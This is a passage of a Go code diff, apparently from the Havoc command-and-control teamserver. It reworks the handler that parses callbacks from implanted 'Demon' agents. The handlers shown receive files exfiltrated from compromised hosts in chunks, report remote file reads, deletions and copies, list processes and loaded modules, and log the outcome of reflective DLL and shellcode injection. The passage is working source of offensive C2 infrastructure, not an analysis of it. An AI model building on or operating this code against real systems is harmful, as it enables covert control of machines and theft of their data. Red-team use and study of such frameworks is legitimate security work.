-					Output["Message"] = fmt.Sprintf("Failed to copied file %v to %v", PathFrom, PathTo)
+					Output["Message"] = "No files/folders at specified path"
 				}
+
+				break
+
+			case DEMON_COMMAND_FS_DOWNLOAD:
+
+				/*
+				 * Download Header:
+				 *  [ Mode      ] Open ( 0 ), Write ( 1 ) or Close ( 2 )
+				 *  [ File ID   ] Download File ID
+				 *
+				 * Data (Open):
+				 *  [ File Size ]
+				 *  [ File Name ]
+				 *
+				 * Data (Write)
+				 *  [ Chunk Data ] Size + FileChunk
+				 *
+				 * Data (Close):
+				 *  [ File Name ]
+				 *  [  Reason   ] Removed or Finished
+				 * */
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+					var (
+						Mode   = Parser.ParseInt32()
+						FileID = Parser.ParseInt32()
+					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DOWNLOAD, Mode: %d, FileID: %x", AgentID, Mode, FileID))
+
+					switch Mode {
+
+					/* File Open */
+					case 0x0:
+						logger.Debug(fmt.Sprintf("Download open FileID:[%x]", FileID))
+
+						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
+							var (
+								FileSize = Parser.ParseInt32()
+								FileName = Parser.ParseUTF16String()
+								Size     = common.ByteCountSI(int64(FileSize))
+							)
+
+							Output["Type"] = "Info"
+							Output["Message"] = fmt.Sprintf("Started download of file: %v [%v]", FileName, Size)
+
+							if err := a.DownloadAdd(FileID, FileName, FileSize); err != nil {
+								Output["Type"] = "Error"
+								Output["Message"] = err.Error()
+							} else {
+								Output["MiscType"] = "download"
+								Output["MiscData2"] = base64.StdEncoding.EncodeToString([]byte(FileName)) + ";" + Size
+							}
+						} else {
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DOWNLOAD, Invalid packet", AgentID))
+						}
+
+						break
+
+					case 0x1:
+						logger.Debug(fmt.Sprintf("Download write FileID:[%v]", FileID))
+
+						if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+							var FileChunk = Parser.ParseBytes()
+
+							a.DownloadWrite(FileID, FileChunk)
+						} else {
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DOWNLOAD, Invalid packet", AgentID))
+						}
+
+						break
+
+					case 0x2:
+						logger.Debug(fmt.Sprintf("Download close FileID:[%v]", FileID))
+
+						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+							var (
+								FileName string
+								Reason   = Parser.ParseInt32()
+							)
+
+							if len(a.Downloads) > 0 {
+								var download = a.DownloadGet(FileID)
+								if download != nil {
+									FileName = download.FilePath
+								}
+
+								if Reason == 0x0 {
+									Output["Type"] = "Good"
+									Output["Message"] = fmt.Sprintf("Finished download of file: %v", FileName)
+
+									a.DownloadClose(FileID)
+								} else if Reason == 0x1 {
+									Output["Type"] = "Info"
+									Output["Message"] = fmt.Sprintf("Download has been removed: %v", FileName)
+
+									a.DownloadClose(FileID)
+								}
+							} else {
+								/* TODO: handle this error. or simply ignore this ? */
+							}
+							a.RequestCompleted(RequestID)
+
+						} else {
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DOWNLOAD, Invalid packet", AgentID))
+						}
+
+						break
+
+					default:
+						logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - UNKNOWN (%d)", AgentID, Mode))
+					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DOWNLOAD, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_COMMAND_FS_UPLOAD:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_UPLOAD", AgentID))
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
+					var (
+						FileSize = Parser.ParseInt32()
+						FileName = Parser.ParseUTF16String()
+					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_UPLOAD, FileSize: %v, FileName: %v", AgentID, FileSize, FileName))
+
+					Output["Type"] = "Info"
+					Output["Message"] = fmt.Sprintf("Uploaded file: %v (%v)", FileName, FileSize)
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_UPLOAD, Invalid packet", AgentID))
+					Output["Type"] = "Error"
+					Output["Message"] = "Failed to parse FS::Upload response"
+				}
+
+				break
+
+			case DEMON_COMMAND_FS_CD:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					var Path = Parser.ParseUTF16String()
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_CD, Path: %v", AgentID, Path))
+
+					Output["Type"] = "Info"
+					Output["Message"] = fmt.Sprintf("Changed directory: %v", Path)
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_CD, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_COMMAND_FS_REMOVE:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
+					var (
+						IsDir = Parser.ParseInt32()
+						Path  = Parser.ParseUTF16String()
+					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_REMOVE, IsDir: %d, Path: %v", AgentID, IsDir, Path))
+
+					Output["Type"] = "Info"
+
+					if IsDir == win32.TRUE {
+						Output["Message"] = fmt.Sprintf("Removed directory: %v", Path)
+					} else {
+						Output["Message"] = fmt.Sprintf("Removed file: %v", Path)
+					}
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_REMOVE, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_COMMAND_FS_MKDIR:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					var Path = Parser.ParseUTF16String()
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_MKDIR, Path: %v", AgentID, Path))
+
+					Output["Type"] = "Info"
+					Output["Message"] = fmt.Sprintf("Created directory: %v", Path)
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_MKDIR, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_COMMAND_FS_COPY:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes, parser.ReadBytes}) {
+					var (
+						Success  = Parser.ParseInt32()
+						PathFrom = Parser.ParseUTF16String()
+						PathTo   = Parser.ParseUTF16String()
+					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_COPY, Success: %d, PathFrom: %v, PathTo: %v", AgentID, Success, PathFrom, PathTo))
+
+					if Success == win32.TRUE {
+						Output["Type"] = "Good"
+						Output["Message"] = fmt.Sprintf("Successful copied file %v to %v", PathFrom, PathTo)
+					} else {
+						Output["Type"] = "Error"
+						Output["Message"] = fmt.Sprintf("Failed to copied file %v to %v", PathFrom, PathTo)
+					}
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_COPY, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_COMMAND_FS_GET_PWD:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					var Path = Parser.ParseUTF16String()
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_GET_PWD, Path: %v", AgentID, Path))
+
+					Output["Type"] = "Info"
+					Output["Message"] = fmt.Sprintf("Current directory: %v", Path)
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_GET_PWD, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_COMMAND_FS_CAT:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadBytes}) {
+					var (
+						FileName    = Parser.ParseUTF16String()
+						Success     = Parser.ParseInt32()
+						FileContent = Parser.ParseString()
+					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_CAT, FileName: %v, Success: %d", AgentID, FileName, Success))
+
+					if Success == win32.TRUE {
+						Output["Type"] = "Info"
+						Output["Message"] = fmt.Sprintf("File content of %v (%v):", FileName, len(FileContent))
+						Output["Output"] = FileContent
+					} else {
+						Output["Type"] = "Erro"
+						Output["Message"] = fmt.Sprintf("Failed to read file: %v", FileName)
+					}
+
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_CAT, Invalid packet", AgentID))
+					Output["Type"] = "Error"
+					Output["Message"] = "Failed to parse fs::cat response"
+				}
+			default:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - UNKNOWN (%d)", AgentID, SubCommand))
 			}
 
-			break
-
-		case 9:
-			var Path = common.DecodeUTF16(Parser.ParseBytes())
-
-			Output["Type"] = "Info"
-			Output["Message"] = fmt.Sprintf("Current directory: %v", string(Path))
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 
 			break
-
-		case 10:
-			if Parser.Length() >= 8 {
-				var (
-					FileName    = Parser.ParseBytes()
-					FileContent = Parser.ParseBytes()
-				)
-				Output["Type"] = "Info"
-				Output["Message"] = fmt.Sprintf("File content of %v (%v):", common.DecodeUTF16(FileName), len(FileContent))
-				Output["Output"] = string(FileContent)
-
-			} else {
-				Output["Type"] = "Error"
-				Output["Message"] = "Failed to parse fs::cat response"
-			}
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS, Invalid packet", AgentID))
 		}
 
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
-
-		break
-
 	case COMMAND_PROC_LIST:
+		logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC_LIST", AgentID))
 		type Process struct {
 			Name      string
 			ImagePath string
@@ -2492,27 +3014,24 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 			ProcessMaxStr int
 		)
 
-		for Parser.Length() != 0 {
+		for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes}) {
 			var (
 				collum  []string
 				Process Process
 			)
 
-			Process.Name = common.DecodeUTF16(Parser.ParseBytes())
+			Process.Name = Parser.ParseUTF16String()
 			Process.PID = strconv.Itoa(Parser.ParseInt32())
 			Process.IsWow = Parser.ParseInt32()
 			Process.PPID = strconv.Itoa(Parser.ParseInt32())
 			Process.Session = strconv.Itoa(Parser.ParseInt32())
 			Process.Threads = strconv.Itoa(Parser.ParseInt32())
-			Process.User = string(Parser.ParseBytes())
+			Process.User = Parser.ParseString()
 
 			var ProcessArch = "x64"
 			if Process.IsWow == win32.TRUE {
 				ProcessArch = "x86"
 			}
-
-			// trim null bytes
-			Process.User = string(bytes.Trim([]byte(Process.User), "\x00"))
 
 			collum = []string{Process.Name, Process.PID, Process.PPID, Process.Session, ProcessArch, Process.Threads, Process.User}
 
@@ -2549,113 +3068,324 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 			Output["MiscType"] = "ProcessUI"
 			Output["MiscData"] = base64.StdEncoding.EncodeToString(ProcessListJson)
 		}
+		a.RequestCompleted(RequestID)
 
 		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 
 	case COMMAND_OUTPUT:
 		var Output = make(map[string]string)
+		var message string
 
-		Output["Type"] = "Good"
-		Output["Output"] = string(Parser.ParseBytes())
-		Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(Output["Output"]))
+		if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+			message = Parser.ParseString()
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_OUTPUT, len: %d", AgentID, len(message)))
 
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
-
-	case CALLBACK_OUTPUT_OEM:
-		var Output = make(map[string]string)
-
-		Output["Type"] = "Good"
-		Output["Output"] = common.DecodeUTF16(Parser.ParseBytes())
-		Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(Output["Output"]))
-
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
-
-	case COMMAND_INJECT_DLL:
-		var (
-			Status  = Parser.ParseInt32()
-			Message = make(map[string]string)
-		)
-
-		if Status == win32.TRUE {
-			Message["Type"] = "Good"
-			Message["Message"] = "Successful injected reflective dll"
-		} else {
-			String, ok := InjectErrors[Status]
-			if ok {
-				String = fmt.Sprintf("Status:[%v]", String)
+			Output["Type"] = "Good"
+			Output["Output"] = message
+			Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(message))
+			if len(message) > 0 {
+				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 			}
-
-			Message["Type"] = "Error"
-			Message["Message"] = "Failed to inject reflective dll: " + String
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_OUTPUT, Invalid packet ", AgentID))
 		}
 
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+	case BEACON_OUTPUT:
+
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+			var Type = Parser.ParseInt32()
+
+			switch Type {
+
+			case CALLBACK_OUTPUT:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_OUTPUT", AgentID))
+
+					found := false
+					for _, BofCallback := range a.BofCallbacks {
+						if BofCallback.TaskID == RequestID {
+							// store the output and later send it back to the python module
+							BofCallback.Output += Parser.ParseString()
+							found = true
+							break
+						}
+					}
+
+					if found == false {
+						// simply print the output on the agent console
+						var Output = make(map[string]string)
+						Output["Type"] = "Good"
+						Output["Output"] = Parser.ParseString()
+						Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(Output["Output"]))
+						if len(Output["Output"]) > 0 {
+							teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+						}
+					}
+
+					break
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_OUTPUT, Invalid packet", AgentID))
+				}
+
+			case CALLBACK_OUTPUT_OEM:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_OUTPUT_OEM", AgentID))
+
+					found := false
+					for _, BofCallback := range a.BofCallbacks {
+						if BofCallback.TaskID == RequestID {
+							// store the output and later send it back to the python module
+							BofCallback.Output += Parser.ParseUTF16String()
+							found = true
+							break
+						}
+					}
+
+					if found == false {
+						// simply print the output on the agent console
+						var Output = make(map[string]string)
+						Output["Type"] = "Good"
+						Output["Output"] = Parser.ParseUTF16String()
+						Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(Output["Output"]))
+						if len(Output["Output"]) > 0 {
+							teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+						}
+					}
+
+					break
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_OUTPUT_OEM, Invalid packet", AgentID))
+				}
+
+			case CALLBACK_ERROR:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_ERROR", AgentID))
+
+					found := false
+					for _, BofCallback := range a.BofCallbacks {
+						if BofCallback.TaskID == RequestID {
+							// store the output and later send it back to the python module
+							BofCallback.Output += Parser.ParseString()
+							found = true
+							break
+						}
+					}
+
+					if found == false {
+						// simply print the output on the agent console
+						var Output = make(map[string]string)
+						Output["Type"] = typeError
+						Output["Output"] = Parser.ParseString()
+						Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(Output["Output"]))
+						if len(Output["Output"]) > 0 {
+							teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+						}
+					}
+
+					break
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_ERROR, Invalid packet", AgentID))
+				}
+
+			case CALLBACK_FILE:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					var Data = Parser.ParseBytes()
+					if len(Data) > 8 {
+						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE", AgentID))
+						var FileID     = int(binary.BigEndian.Uint32(Data[0:4]))
+						var FileLength = int(binary.BigEndian.Uint32(Data[4:8]))
+						var FileName   = string(Data[8:])
+
+						var Output = make(map[string]string)
+						Output["Type"] = "Info"
+						Output["Message"] = fmt.Sprintf("Started download of file: %v [%v]", FileName, FileLength)
+						logger.Debug(Output["Message"])
+
+						if err := a.DownloadAdd(FileID, FileName, FileLength); err != nil {
+							Output["Type"] = "Error"
+							Output["Message"] = err.Error()
+						} else {
+							Output["MiscType"] = "download"
+							Output["MiscData2"] = base64.StdEncoding.EncodeToString([]byte(FileName)) + ";" + common.ByteCountSI(int64(FileLength))
+						}
+						teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+					} else {
+						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE, Invalid packet", AgentID))
+					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE, Invalid packet", AgentID))
+				}
+
+				break
+
+			case CALLBACK_FILE_WRITE:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					var Data = Parser.ParseBytes()
+					if len(Data) >= 4 {
+						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE_WRITE", AgentID))
+
+						var FileID     = int(binary.BigEndian.Uint32(Data[0:4]))
+						var FileChunk  = Data[4:]
+
+						var err = a.DownloadWrite(FileID, FileChunk)
+						if err != nil {
+							var Output = make(map[string]string)
+							Output["Type"] = "Error"
+							Output["Message"] = err.Error()
+							teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+						}
+					} else {
+						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE_WRITE, Invalid packet", AgentID))
+					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE_WRITE, Invalid packet", AgentID))
+				}
+
+				break
+
+			case CALLBACK_FILE_CLOSE:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					var Data = Parser.ParseBytes()
+					if len(Data) >= 4 {
+						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE_CLOSE", AgentID))
+
+						var FileID = int(binary.BigEndian.Uint32(Data[0:4]))
+
+						var download = a.DownloadGet(FileID)
+						if download != nil {
+							var Output = make(map[string]string)
+							Output["Type"] = "Good"
+							Output["Message"] = fmt.Sprintf("Finished download of file: %v", download.FilePath)
+							teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+						} else {
+							logger.Debug("download == nil")
+						}
+
+						a.DownloadClose(FileID)
+
+					} else {
+						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE_CLOSE, Invalid packet", AgentID))
+					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE_CLOSE, Invalid packet", AgentID))
+				}
+
+				break
+
+			default:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - UNKNOWN (%d)", AgentID, Type))
+			}
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT, Invalid packet", AgentID))
+		}
+
+	case COMMAND_INJECT_DLL:
+
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+			var (
+				Status  = Parser.ParseInt32()
+				Message = make(map[string]string)
+			)
+
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INJECT_DLL, Status: %d", AgentID, Status))
+
+			if Status == 0 {
+				Message["Type"] = "Good"
+				Message["Message"] = "Successful injected reflective dll"
+			} else {
+				String, ok := InjectErrors[Status]
+				if ok {
+					String = fmt.Sprintf("Status:[%v]", String)
+				}
+
+				Message["Type"] = "Error"
+				Message["Message"] = "Failed to inject reflective dll: " + String
+			}
+
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INJECT_DLL, Invalid packet", AgentID))
+		}
 
 		break
 
 	case COMMAND_SPAWNDLL:
-		var (
-			Status  = Parser.ParseInt32()
-			Message = make(map[string]string)
-		)
 
-		if Status == win32.TRUE {
-			Message["Type"] = "Good"
-			Message["Message"] = "Successful spawned reflective dll"
-		} else {
-			String, ok := InjectErrors[Status]
-			if ok {
-				String = fmt.Sprintf("Status:[%v]", String)
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+			var (
+				Status  = Parser.ParseInt32()
+				Message = make(map[string]string)
+			)
+
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SPAWNDLL, Status: %d", AgentID, Status))
+
+			if Status == 0 {
+				Message["Type"] = "Good"
+				Message["Message"] = "Successful spawned reflective dll"
+			} else {
+				String, ok := InjectErrors[Status]
+				if ok {
+					String = fmt.Sprintf("Status:[%v]", String)
+				}
+
+				Message["Type"] = "Error"
+				Message["Message"] = "Failed to spawned reflective dll: " + String
 			}
 
-			Message["Type"] = "Error"
-			Message["Message"] = "Failed to spawned reflective dll: " + String
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SPAWNDLL, Invalid packet", AgentID))
 		}
-
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
 	case COMMAND_INJECT_SHELLCODE:
-		var (
-			Status  = Parser.ParseInt32()
-			Message = make(map[string]string)
-		)
 
-		if Status == win32.TRUE {
-			Message["Type"] = "Good"
-			Message["Message"] = "Successful injected shellcode"
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+			var (
+				Status  = Parser.ParseInt32()
+				Message = make(map[string]string)
+			)
+
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INJECT_SHELLCODE, Status: %d", AgentID, Status))
+
+			if Status == win32.TRUE {
+				Message["Type"] = "Good"
+				Message["Message"] = "Successful injected shellcode"
+			} else {
+				Message["Type"] = "Error"
+				Message["Message"] = "Failed to inject shellcode"
+			}
+
+			a.RequestCompleted(RequestID)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 		} else {
-			Message["Type"] = "Error"
-			Message["Message"] = "Failed to inject shellcode"
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INJECT_SHELLCODE, Invalid packet", AgentID))
 		}
-
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
 	case COMMAND_PROC:
 		var (
 			Message    = make(map[string]string)
-			SubCommand = Parser.ParseInt32()
+			SubCommand int
 		)
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 
-		switch SubCommand {
-		case 1:
-			break
+			SubCommand = Parser.ParseInt32()
 
-		case 2:
-			if Parser.Length() > 0 {
-				var (
-					ModuleName string
-					ModuleBase string
-					ProcessID  = Parser.ParseInt32()
+			switch SubCommand {
+			case DEMON_COMMAND_PROC_MODULES:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_MODULES", AgentID))
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					var (
+						ModuleName string
+						ModuleBase string
+						ProcessID  = Parser.ParseInt32()
 
-					OutputBuffer bytes.Buffer
-					tableData    [][]string
-				)
-
-				for Parser.Length() != 0 {
+						OutputBuffer bytes.Buffer
+						tableData    [][]string
+					)
 
 					table := tablewriter.NewWriter(&OutputBuffer)
 
@@ -2667,199 +3397,249 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 					table.SetColumnSeparator("│")
 					table.SetCenterSeparator("+")
 
-					for Parser.Length() != 0 {
+					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadPointer}) {
 						var (
 							collum []string
 						)
 
-						ModuleName = string(Parser.ParseBytes())
-						ModuleBase = "0x0" + strconv.FormatInt(int64(uint32(Parser.ParseInt32())), 16)
+						ModuleName = Parser.ParseString()
+						ModuleBase = "0x" + strconv.FormatInt(Parser.ParsePointer(), 16)
 
 						collum = []string{strings.ReplaceAll(ModuleName, " ", ""), ModuleBase} // TODO: fix this to avoid new line in the havoc console
 						tableData = append(tableData, collum)
 					}
 					table.AppendBulk(tableData)
 					table.Render()
-				}
 
-				Message["Type"] = "Info"
-				Message["Message"] = fmt.Sprintf("List loaded modules/dll from process %v:", ProcessID)
-				Message["Output"] = "\n" + OutputBuffer.String()
+					Message["Type"] = "Info"
+					Message["Message"] = fmt.Sprintf("List loaded modules/dll from process %v:", ProcessID)
+					Message["Output"] = "\n" + OutputBuffer.String()
 
-			} else {
-				Message["Type"] = "Error"
-				Message["Message"] = "Couldn't list loaded modules/dll from specified process: "
-			}
-			break
-
-		case 3:
-			if Parser.Length() > 0 {
-				var (
-					ProcName  string
-					ProcID    int
-					ParentPID int
-					ProcUser  string
-					ProcArch  int
-
-					Output string
-				)
-
-				for Parser.Length() != 0 {
-					ProcName = string(Parser.ParseBytes())
-					ProcID = Parser.ParseInt32()
-					ParentPID = Parser.ParseInt32()
-					ProcUser = string(Parser.ParseBytes())
-					ProcArch = Parser.ParseInt32()
-
-					Output += fmt.Sprintf(
-						"\n   Process Name : %v\n   Process ID   : %v\n   Parent PID   : %v\n   Process User : %v\n   Process Arch : x%v\n",
-						ProcName, ProcID, ParentPID, ProcUser, ProcArch,
-					)
-				}
-
-				Message["Type"] = "Info"
-				Message["Message"] = "Found one or more processes:"
-				Message["Output"] = Output
-
-			} else {
-				Message["Type"] = "Error"
-				Message["Message"] = "Couldn't find specified process"
-			}
-			break
-
-		case 4: // Proc:Create
-
-			if Parser.Length() >= 4 {
-				var ProcessID = Parser.ParseInt32()
-
-				Message["Type"] = "Info"
-				Message["Message"] = fmt.Sprintf("Successful spawned a process: %v", ProcessID)
-			}
-
-			break
-
-		case 5: // Proc:BlockDll
-			var (
-				BlockDll = int(Parser.ParseInt32())
-				State    = "disabled"
-			)
-
-			if BlockDll == 1 {
-				State = "enabled"
-			}
-
-			Message["Type"] = "Info"
-			Message["Message"] = "Successful " + State + " blockdll"
-			break
-
-		case 6: // Proc:Memory
-			var (
-				BaseAddress    string
-				RegionSize     string
-				AllocateProtec string
-				// State 			string
-				// Type			string
-
-				iProtect int
-				iState   int
-				iType    int
-
-				_ = Parser.ParseInt32()
-				_ = Parser.ParseInt32()
-
-				OutputBuffer bytes.Buffer
-				tableData    [][]string
-			)
-
-			for Parser.Length() != 0 {
-
-				table := tablewriter.NewWriter(&OutputBuffer)
-
-				table.SetHeader([]string{"Base Address", "Type", "Protection", "State", "Region Size"})
-				table.SetBorder(false)
-				table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)
-				table.SetColumnAlignment([]int{tablewriter.ALIGN_CENTER, tablewriter.ALIGN_CENTER, tablewriter.ALIGN_CENTER, tablewriter.ALIGN_CENTER, tablewriter.ALIGN_RIGHT})
-
-				table.SetRowSeparator("-")
-				table.SetColumnSeparator("│")
-				table.SetCenterSeparator("+")
-
-				for Parser.Length() != 0 {
-					var (
-						collum []string
-					)
-
-					BaseAddress = "0x0" + strconv.FormatInt(int64(Parser.ParseInt32()), 16)
-					RegionSize = utils.ByteCountSI(int64(Parser.ParseInt32()))
-					iProtect = int(Parser.ParseInt32())
-					iState = int(Parser.ParseInt32())
-					iType = int(Parser.ParseInt32())
-
-					if Protection, ok := win32.Protections[iProtect]; !ok {
-						AllocateProtec = "UNKNOWN"
-					} else {
-						AllocateProtec = Protection[0]
-					}
-
-					/*switch iProtect {
-
-					  case win32.PAGE_NOACCESS:
-					  	AllocateProtec = "PAGE_NOACCESS"
-					  case win32.PAGE_READONLY:
-					  	AllocateProtec = "PAGE_READONLY"
-					  case win32.PAGE_READWRITE:
-					  	AllocateProtec = "PAGE_READWRITE"
-					  case win32.PAGE_WRITECOPY:
-					  	AllocateProtec = "PAGE_WRITECOPY"
-					  case win32.PAGE_EXECUTE:
-					  	AllocateProtec = "PAGE_EXECUTE"
